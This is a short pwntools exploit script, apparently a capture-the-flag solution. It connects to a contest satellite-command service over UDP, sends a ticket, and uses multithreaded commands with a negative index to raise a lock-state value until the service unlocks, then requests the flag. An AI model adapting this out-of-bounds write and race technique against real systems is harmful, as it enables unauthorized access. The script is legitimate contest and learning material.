from pwn import *
import threading
from struct import pack

host = ''
port = ''

'''
r = remote('127.0.0.1', 54321, typ='udp')
host = '127.0.0.1'
port = '54321'
'''

r = remote('lucky-tree.satellitesabove.me', 5008)
def send_ticket():
    global host
    global port
    r.recvline()
    ticket = 'ticket{mike293094bravo2:GPCVE0ufsxsS-ij5MRu5MNOdUn6cEa6YnH5I00XF22ZTXeY89JKR8GGgq30hC5JGXA}'
    r.sendline(ticket)
    r.recvuntil('udp:')
    host += r.recvuntil(':')[:-1].decode('utf-8')
    port += r.recvline().strip().decode('utf-8')
    print(f'server : {host}:{port}')
    r.close()

send_ticket()
r = remote(host, port, typ='udp')

def pack_cmd(version, typ, cmd_id):
    cmd = pack('h', version) + pack('h', typ) + pack('i', cmd_id)
    return cmd

def send_cmd(r, version, typ, cmd_id):
    cmd = pack_cmd(version, typ, cmd_id)
    r.sendline(cmd)
    res = r.recv().strip().decode('utf-8')
    print(res)
    if 'UNLOCKED' in res:
        r.sendline(pack_cmd(1, 1, 9))
        print(r.recv().decode('utf-8'))

# offset between lock_state and command_lo
offset = 0x55badda03030 - 0x55badda03038
print(f'offset: {hex(offset)}')

def job():
    r = remote(host, port, typ='udp')
    for i in range(32):
        send_cmd(r, 1, 1, -8)
        # lock_state += 1
    print('Done')
    r.close()

threads = []
for i in range(7):
    threads.append(threading.Thread(target = job))
    threads[i].start()

for t in threads:
    t.join()


for i in range(32):
    send_cmd(r, 1, 1, -8)

send_cmd(r, 1, 1, 9)
print(r.recv())


